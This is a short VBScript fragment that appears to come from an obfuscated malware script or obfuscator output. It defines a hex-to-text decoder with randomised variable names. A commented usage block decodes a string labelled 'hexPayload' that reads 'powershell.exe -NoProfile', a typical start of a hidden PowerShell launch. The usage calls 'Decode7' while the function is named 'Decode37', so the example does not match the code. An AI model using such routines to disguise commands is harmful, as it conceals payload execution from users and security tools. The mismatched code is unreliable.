Function Decode37(h33_uuMZSz)
    Dim r34_JiJVptrxLr, i35_cwzEEji, l36_deaOg, m37_iihDR
    l36_deaOg = Len(h33_uuMZSz)
    r34_JiJVptrxLr = ""
    For i35_cwzEEji = 1 To l36_deaOg Step 2
        m37_iihDR = Mid(h33_uuMZSz, i35_cwzEEji, 2)
        r34_JiJVptrxLr = r34_JiJVptrxLr & Chr(CLng("&H" & m37_iihDR))
    Next
    Decode37 = r34_JiJVptrxLr
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode7(hexPayload)
'' WScript.Echo result
